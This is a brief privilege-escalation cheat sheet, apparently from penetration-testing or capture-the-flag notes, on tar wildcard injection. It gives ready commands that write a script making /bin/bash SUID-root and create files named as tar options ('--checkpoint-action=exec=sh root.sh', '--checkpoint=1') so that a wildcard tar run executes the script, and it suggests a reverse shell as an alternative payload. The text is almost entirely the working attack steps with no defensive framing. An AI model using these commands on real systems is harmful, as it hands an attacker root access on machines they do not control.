```
If wildcard is used in the command, arbitrary commands can be run allowinf privilege escalation

Create a script file with a reverse shell or other command:
echo 'chmod 4755 /bin/bash' > root.sh && chmod +x root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

Run the tar command with the wildcard and see if the script worked.
```